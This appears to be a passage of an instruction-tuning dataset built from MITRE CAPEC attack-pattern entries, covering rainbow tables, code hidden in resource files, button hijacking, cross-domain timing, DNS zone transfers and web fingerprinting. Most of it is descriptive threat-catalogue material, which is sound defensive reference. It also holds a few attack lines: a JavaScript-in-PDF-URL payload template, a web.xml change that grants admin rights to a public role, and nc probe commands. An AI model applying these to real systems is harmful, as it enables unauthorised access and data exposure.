        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker gets access to the database table where hashes of passwords are stored. They then use a rainbow table of pre-computed hash chains to attempt to look up the original password. Once the original password corresponding to the hash is obtained, the attacker uses the original password to gain access to the system.",
        "Extended_Description": {
          "xhtml:p": "A password rainbow table stores hash chains for various passwords. A password chain is computed, starting from the original password, P, via a reduce(compression) function R and a hash function H. A recurrence relation exists where Xi+1 = R(H(Xi)), X0 = P. Then the hash chain of length n for the original password P can be formed: X1, X2, X3, ... , Xn-2, Xn-1, Xn, H(Xn). P and H(Xn) are then stored together in the rainbow table. Constructing the rainbow tables takes a very long time and is computationally expensive. A separate table needs to be constructed for the various hash algorithms (e.g. SHA1, MD5, etc.). However, once a rainbow table is computed, it can be very effective in cracking the passwords that have been hashed without the use of salt."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "49"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "600"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "151"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "560"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "561"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "653"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine application's/system's password policy] Determine the password policies of the target application/system.",
              "Technique": [
                "Determine minimum and maximum allowed password lengths.",
                "Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc.).",
                "Determine account lockout policy (a strict account lockout policy will prevent brute force attacks)."
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Obtain password hashes] An attacker gets access to the database table storing hashes of passwords or potentially just discovers a hash of an individual password.",
              "Technique": [
                "Obtain copy of database table or flat file containing password hashes (by breaking access controls, using SQL Injection, etc.)",
                "Obtain password hashes from platform-specific storage locations (e.g. Windows registry)",
                "Sniff network packets containing password hashes."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Run rainbow table-based password cracking tool] An attacker finds or writes a password cracking tool that uses a previously computed rainbow table for the right hashing algorithm. It helps if the attacker knows what hashing algorithm was used by the password system.",
              "Technique": "Run rainbow table-based password cracking tool such as Ophcrack or RainbowCrack. Reduction function must depend on application's/system's password policy."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "Hash of the original password is available to the attacker. For a better chance of success, an attacker should have more than one hash of the original password, and ideally the whole table.",
            "Salt was not used to create the hash of the original password. Otherwise the rainbow tables have to be re-computed, which is very expensive and will make the attack effectively infeasible (especially if salt was added in iterations).",
            "The system uses one factor password based authentication."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "A variety of password cracking tools are available that can leverage a rainbow table. The more difficult part is to obtain the password hash(es) in the first place."
          }
        },
        "Resources_Required": {
          "Resource": "Rainbow table of password hash chains with the right algorithm used. A password cracking tool that leverages this rainbow table will also be required. Hash(es) of the password is required."
        },
        "Indicators": {
          "Indicator": "This is a completely offline attack that an attacker can perform at their leisure after the password hashes are obtained."
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Confidentiality",
              "Access Control",
              "Authorization"
            ],
            "Impact": "Gain Privileges"
          }
        },
        "Mitigations": {
          "Mitigation": "Use salt when computing password hashes. That is, concatenate the salt (random bits) with the original password prior to hashing it."
        },
        "Example_Instances": {
          "Example": "BusyBox 1.1.1 does not use a salt when generating passwords, which makes it easier for local users to guess passwords from a stolen password file using techniques such as rainbow tables. See also: CVE-2006-1058"
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "261"
            },
            {
              "@CWE_ID": "521"
            },
            {
              "@CWE_ID": "262"
            },
            {
              "@CWE_ID": "263"
            },
            {
              "@CWE_ID": "654"
            },
            {
              "@CWE_ID": "916"
            },
            {
              "@CWE_ID": "308"
            },
            {
              "@CWE_ID": "309"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1110.002",
            "Entry_Name": "Brute Force:Password Cracking"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description, Related_Attack_Patterns, Related_Weaknesses, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated @Abstraction, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Leverage Executable Code in Non-Executable Files (CAPEC ID: 35), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nAbility to communicate synchronously or asynchronously with server that publishes an over-privileged directory, program, or interface. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Ability to communicate synchronously or asynchronously with server that publishes an over-privileged directory, program, or interface. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.",
      "@Name": "Leverage Executable Code in Non-Executable Files (CAPEC ID: 35)",
      "attack_ptrn": {
        "@ID": "35",
        "@Name": "Leverage Executable Code in Non-Executable Files",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attack of this type exploits a system's trust in configuration and resource files. When the executable loads the resource (such as an image file or configuration file) the attacker has modified the file to either execute malicious code directly or manipulate the target process (e.g. application server) to execute based on the malicious configuration parameters. Since systems are increasingly interrelated mashing up resources from local and remote sources the possibility of this attack occurring is high.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "636"
            },
            {
              "@Nature": "PeerOf",
              "@CAPEC_ID": "23"
            },
            {
              "@Nature": "PeerOf",
              "@CAPEC_ID": "75"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The attacker must have the ability to modify non-executable files consumed by the target software."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "To identify and execute against an over-privileged system interface"
          }
        },
        "Resources_Required": {
          "Resource": "Ability to communicate synchronously or asynchronously with server that publishes an over-privileged directory, program, or interface. Optionally, ability to capture output directly through synchronous communication or other method such as FTP."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Enforce principle of least privilege",
            "Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.",
            "Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.",
            "Implementation: Implement host integrity monitoring to detect any unwanted altering of configuration files.",
            "Implementation: Ensure that files that are not required to execute, such as configuration files, are not over-privileged, i.e. not allowed to execute."
          ]
        },
        "Example_Instances": {
          "Example": [
            "Virtually any system that relies on configuration files for runtime behavior is open to this attack vector. The configuration files are frequently stored in predictable locations, so an attacker that can fingerprint a server process such as a web server or database server can quickly identify the likely locale where the configuration is stored. And this is of course not limited to server processes. Unix shells rely on profile files to store environment variables, search paths for programs and so on. If the aliases are changed, then a standard Unix \"cp\" command can be rerouted to \"rm\" or other standard command so the user's intention is subverted.",
            "The attack can be directed at a client system, such as causing buffer overrun through loading seemingly benign image files, as in Microsoft Security Bulletin MS04-028 where specially crafted JPEG files could cause a buffer overrun once loaded into the browser.",
            {
              "xhtml:p": [
                "Another example targets clients reading pdf files. In this case the attacker simply appends javascript to the end of a legitimate url for a pdf (http://www.gnucitizen.org/blog/danger-danger-danger/)",
                "http://path/to/pdf/file.pdf#whatever_name_you_want=javascript:your_code_here",
                "The client assumes that they are reading a pdf, but the attacker has modified the resource and loaded executable javascript into the client's browser process."
              ]
            },
            {
              "xhtml:p": [
                "The attack can also target server processes. The attacker edits the resource or configuration file, for example a web.xml file used to configure security permissions for a J2EE app server, adding role name \"public\" grants all users with the public role the ability to use the administration functionality.",
                "The server trusts its configuration file to be correct, but when they are manipulated, the attacker gains full control."
              ],
              "xhtml:div": {
                "@style": "margin-left:1em;",
                "@class": "informative",
                "xhtml:div": {
                  "@style": "margin-left:1em;",
                  "xhtml:br": [
                    null,
                    null,
                    null
                  ],
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": {
                      "@style": "margin-left:1em;",
                      "xhtml:br": null,
                      "#text": "<role-name>administrator</role-name><role-name>public</role-name>"
                    },
                    "xhtml:br": null,
                    "#text": "<auth-constraint>\n                        </auth-constraint>"
                  },
                  "#text": "<description>Security processing rules for admin screens</description><url-pattern>/admin/*</url-pattern><http-method>POST</http-method><http-method>GET</http-method>"
                },
                "xhtml:br": null,
                "#text": "< security-constraint>\n                  </security-constraint>"
              }
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "94"
            },
            {
              "@CWE_ID": "96"
            },
            {
              "@CWE_ID": "95"
            },
            {
              "@CWE_ID": "97"
            },
            {
              "@CWE_ID": "272"
            },
            {
              "@CWE_ID": "59"
            },
            {
              "@CWE_ID": "282"
            },
            {
              "@CWE_ID": "270"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1027.006",
              "Entry_Name": "Obfuscated Files or Information: HTML Smuggling"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1027.009",
              "Entry_Name": "Obfuscated Files or Information:\u00a0Embedded Payloads"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1564.009",
              "Entry_Name": "Hide Artifacts: Resource Forking"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Description, Description Summary, Examples-Instances, Related_Attack_Patterns, Type (Attack_Pattern -> Relationship)"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Application API Button Hijacking (CAPEC ID: 388)",
    "context": "",
    "output": "The resources required to execute Application API Button Hijacking (CAPEC ID: 388) are the following: A software program that allows the use of adversary-in-the-middle (CAPEC-94) communications between the client and server, such as a adversary-in-the-middle (CAPEC-94) proxy.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A software program that allows the use of adversary-in-the-middle (CAPEC-94) communications between the client and server, such as a adversary-in-the-middle (CAPEC-94) proxy.",
      "@Name": "Application API Button Hijacking (CAPEC ID: 388)",
      "attack_ptrn": {
        "@ID": "388",
        "@Name": "Application API Button Hijacking",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker manipulates either egress or ingress data from a client within an application framework in order to change the destination and/or content of buttons displayed to a user within API messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that looks authentic but contains buttons that point to an attacker controlled destination.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "386"
          }
        },
        "Prerequisites": {
          "Prerequisite": "Targeted software is utilizing application framework APIs"
        },
        "Resources_Required": {
          "Resource": "A software program that allows the use of adversary-in-the-middle (CAPEC-94) communications between the client and server, such as a adversary-in-the-middle (CAPEC-94) proxy."
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "An in-game event occurs and the attacker traps the result, which turns out to be a form that will be populated to their primary profile. The attacker, using a MITM proxy, observes the following data:",
              "By altering the destination of \"Claim_Link\" to point to the attackers' server an unwitting victim can be enticed to click the link. Another example would be for the attacker to rewrite the button destinations for an event so that clicking \"Yes\" or \"No\" causes the user to load the attackers' code."
            ],
            "xhtml:div": {
              "@style": "margin-left:1em;",
              "@class": "informative",
              "#text": "[Button][Claim_Item]Sourdough_Cookie[URL_IMG]foo[/URL_IMG][Claim_Link]bar[/Claim_Link]"
            }
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "471"
            },
            {
              "@CWE_ID": "345"
            },
            {
              "@CWE_ID": "346"
            },
            {
              "@CWE_ID": "602"
            },
            {
              "@CWE_ID": "311"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-327"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Description, Description Summary, Examples-Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated @Abstraction"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Cross-Domain Search Timing (CAPEC ID: 462)",
    "context": "",
    "output": "required resources:\nAbility to issue GET / POST requests cross domain",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Ability to issue GET / POST requests cross domain",
      "@Name": "Cross-Domain Search Timing (CAPEC ID: 462)",
      "attack_ptrn": {
        "@ID": "462",
        "@Name": "Cross-Domain Search Timing",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker initiates cross domain HTTP / GET requests and times the server responses. The timing of these responses may leak important information on what is happening on the server. Browser's same origin policy prevents the attacker from directly reading the server responses (in the absence of any other weaknesses), but does not prevent the attacker from timing the responses to requests that the attacker issued cross domain.",
        "Extended_Description": {
          "xhtml:p": "For GET requests an attacker could for instance leverage the \"img\" tag in conjunction with \"onload() / onerror()\" javascript events. For the POST requests, an attacker could leverage the \"iframe\" element and leverage the \"onload()\" event. There is nothing in the current browser security model that prevents an attacker to use these methods to time responses to the attackers' cross domain requests. The timing for these responses leaks information. For instance, if a victim has an active session with their online e-mail account, an attacker could issue search requests in the victim's mailbox. While the attacker is not able to view the responses, based on the timings of the responses, the attacker could ask yes / no questions as to the content of victim's e-mails, who the victim e-mailed, when, etc. This is but one example; There are other scenarios where an attacker could infer potentially sensitive information from cross domain requests by timing the responses while asking the right questions that leak information."
        },
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "54"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine service to send cross domain requests to] The adversary first determines which service they will be sending the requests to"
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Send and time various cross domain requests] Adversaries will send a variety of cross domain requests to the target, timing the time it takes for the target to respond. Although they won't be able to read the response, the adversary can use the time to infer information about what the service did upon receiving the request.",
              "Technique": [
                "Using a GET request, leverage the \"img\" tag in conjunction with \"onload() / onerror()\" javascript events to time a response",
                "Using a POST request, leverage the \"iframe\" element and use the \"onload()\" event to time a response"
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Infer information from the response time] After obtaining reponse times to various requests, the adversary will compare these times and infer potentially sensitive information. An example of this could be asking a service to retrieve information and random usernames. If one request took longer to process, it is likely that a user with that username exists, which could be useful knowledge to an adversary.",
              "Technique": "Compare timing of different requests to infer potentially sensitive information about a target service"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Ability to issue GET / POST requests cross domainJava Script is enabled in the victim's browserThe victim has an active session with the site from which the attacker would like to receive informationThe victim's site does not protect search functionality with cross site request forgery (CSRF) protection"
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Some knowledge of Java Script"
          }
        },
        "Resources_Required": {
          "Resource": "Ability to issue GET / POST requests cross domain"
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Design: The victim's site could protect all potentially sensitive functionality (e.g. search functions) with cross site request forgery (CSRF) protection and not perform any work on behalf of forged requests",
            "Design: The browser's security model could be fixed to not leak timing information for cross domain requests"
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "385"
            },
            {
              "@CWE_ID": "352"
            },
            {
              "@CWE_ID": "208"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-399"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Consequences"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: DNS Zone Transfers (CAPEC ID: 291)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern DNS Zone Transfers (CAPEC ID: 291):\nA client application capable of interacting with the DNS server or a command-line utility or web application that automates DNS interactions.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A client application capable of interacting with the DNS server or a command-line utility or web application that automates DNS interactions.",
      "@Name": "DNS Zone Transfers (CAPEC ID: 291)",
      "attack_ptrn": {
        "@ID": "291",
        "@Name": "DNS Zone Transfers",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An attacker exploits a DNS misconfiguration that permits a ZONE transfer. Some external DNS servers will return a list of IP address and valid hostnames. Under certain conditions, it may even be possible to obtain Zone data about the organization's internal network. When successful the attacker learns valuable information about the topology of the target organization, including information about particular servers, their role within the IT structure, and possibly information about the operating systems running upon the network. This is configuration dependent behavior so it may also be required to search out multiple DNS servers while attempting to find one with ZONE transfers allowed.",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "309"
          }
        },
        "Prerequisites": {
          "Prerequisite": "Access to a DNS server that allows Zone transfers."
        },
        "Resources_Required": {
          "Resource": "A client application capable of interacting with the DNS server or a command-line utility or web application that automates DNS interactions."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data"
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-33",
            "@Section": "Chapter 2: Scanning, pp. 34"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2018-07-31",
            "Modification_Comment": "Updated Related_Weaknesses"
          }
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Web Application Fingerprinting (CAPEC ID: 170)",
    "context": "",
    "output": "required resources:\nWhile simple fingerprinting can be accomplished with only a web browser, for more thorough fingerprinting an attacker requires a variety of tools to collect information about the target. These tools might include protocol analyzers, web-site crawlers, and fuzzing tools. Footprinting a service adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "While simple fingerprinting can be accomplished with only a web browser, for more thorough fingerprinting an attacker requires a variety of tools to collect information about the target. These tools might include protocol analyzers, web-site crawlers, and fuzzing tools. Footprinting a service adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected.",
      "@Name": "Web Application Fingerprinting (CAPEC ID: 170)",
      "attack_ptrn": {
        "@ID": "170",
        "@Name": "Web Application Fingerprinting",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker sends a series of probes to a web application in order to elicit version-dependent and type-dependent behavior that assists in identifying the target. An attacker could learn information such as software versions, error pages, and response headers, variations in implementations of the HTTP protocol, directory structures, and other similar information about the targeted service. This information can then be used by an attacker to formulate a targeted attack plan. While web application fingerprinting is not intended to be damaging (although certain activities, such as network scans, can sometimes cause disruptions to vulnerable applications inadvertently) it may often pave the way for more damaging attacks.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "541"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Request fingerprinting] Use automated tools or send web server specific commands to web server and wait for server's response.",
              "Technique": "Use automated tools or send web server specific commands to web server and then receive server's response."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Increase the accuracy of server fingerprinting of Web servers] Attacker usually needs to send several different commands to accurately identify the web server. Attacker can also use automated tools to send requests to the server. The responses of the server may be different in terms of protocol behavior.",
              "Technique": [
                "Observe the ordering of the several HTTP response headers. The ordering of the header of each server may have unique identities.",
                "Send bad requests or requests of nonexistent pages to the server.",
                "Attacker takes existing automated tools to recognize the type and the version of the web server in use."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Identify Web Application Software] After the web server platform software has been identified, the attacker start to identify web application technologies such as ASP, .NET, PHP and Java on the server.",
              "Technique": [
                "Examine the file name extensions in URL, for example .php indicates PHP script interfaced with Apache server.",
                "Examine the HTTP Response Headers. This may leak information about software signatures",
                "Examine Cookies that may contain server's software information.",
                "Check error pages."
              ]
            },
            {
              "Step": "4",
              "Phase": "Experiment",
              "Description": "[Identify Backend Database Version] Determining the database engine type can assist attackers' attempt to successfully execute SQL injection. Some database API such as ODBC will show a database type as part of the driver information when reporting an error.",
              "Technique": "Use tools to send bogus SQL query to the server and check error pages."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Any web application can be fingerprinted. However, some configuration choices can limit the useful information an attacker may collect during a fingerprinting attack."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Attacker knows how to send HTTP request, SQL query to a web application."
          }
        },
        "Resources_Required": {
          "Resource": "While simple fingerprinting can be accomplished with only a web browser, for more thorough fingerprinting an attacker requires a variety of tools to collect information about the target. These tools might include protocol analyzers, web-site crawlers, and fuzzing tools. Footprinting a service adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Other",
            "Note": "Information Leakage"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Implementation: Obfuscate server fields of HTTP response.",
            "Implementation: Hide inner ordering of HTTP response header.",
            "Implementation: Customizing HTTP error codes such as 404 or 500.",
            "Implementation: Hide URL file extension.",
            "Implementation: Hide HTTP response header software information filed.",
            "Implementation: Hide cookie's software information filed.",
            "Implementation: Appropriately deal with error messages.",
            "Implementation: Obfuscate database type in Database API's error message."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "An attacker sends malformed requests or requests of nonexistent pages to the server. Consider the following HTTP responses.",
              "[REF-37]"
            ],
            "xhtml:b": [
              "Response from Apache 1.3.23",
              "Response from IIS 5.0"
            ],
            "xhtml:div": [
              {
                "@style": "margin-left:1em;",
                "@class": "informative",
                "xhtml:br": [
                  null,
                  null,
                  null,
                  null,
                  null,
                  null,
                  null,
                  null
                ],
                "#text": "$ nc apache.server.com80 GET / HTTP/3.0\n                  HTTP/1.1 400 Bad RequestDate: Sun, 15 Jun 2003 17:12: 37 GMTServer: Apache/1.3.23Connection: closeTransfer: chunkedContent-Type: text/HTML; charset=iso-8859-1"
              },
              {
                "@style": "margin-left:1em;",
                "@class": "informative",
                "xhtml:br": [
                  null,
                  null,
                  null,
                  null,
                  null,
                  null,
                  null,
                  null,
                  null,
                  null
                ],
                "#text": "$ nc iis.server.com 80GET / HTTP/3.0\n                  HTTP/1.1 200 OKServer: Microsoft-IIS/5.0Content-Location: http://iis.example.com/Default.htmDate: Fri, 01 Jan 1999 20:14: 02 GMTContent-Type: text/HTMLAccept-Ranges: bytes Last-Modified: Fri, 01 Jan 1999 20:14: 02 GMTETag: W/e0d362a4c335be1: ae1Content-Length: 133"
              }
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "497"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-36"
            },
            {
              "@External_Reference_ID": "REF-37",
              "@Section": "Testing for Web Application Fingerprint (OWASP-IG-004)"
            },
            {
              "@External_Reference_ID": "REF-38"
            },
            {
              "@External_Reference_ID": "REF-39",
              "@Section": "WASC-45 - Fingerprinting"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Phases, References"
            },
            {
